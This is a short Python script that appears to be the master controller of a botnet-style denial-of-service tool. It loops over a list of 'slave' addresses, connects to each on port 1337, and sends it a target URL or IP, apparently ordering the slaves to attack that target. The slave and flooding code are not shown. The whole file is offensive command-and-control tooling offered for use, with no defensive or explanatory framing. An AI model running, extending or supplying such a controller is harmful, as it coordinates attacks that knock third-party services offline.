#!/usr/bin/python
import socket
#Put Slave Addresses in addresses array
addresses=['127.0.0.1','127.0.0.1']
#Set target to url or IP - ie 127.0.0.1 or www.mysite.org
target = '127.0.0.1'
port = 1337
for host in addresses:
	master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	master.connect((host,port))
	master.send(target)
	master.close()
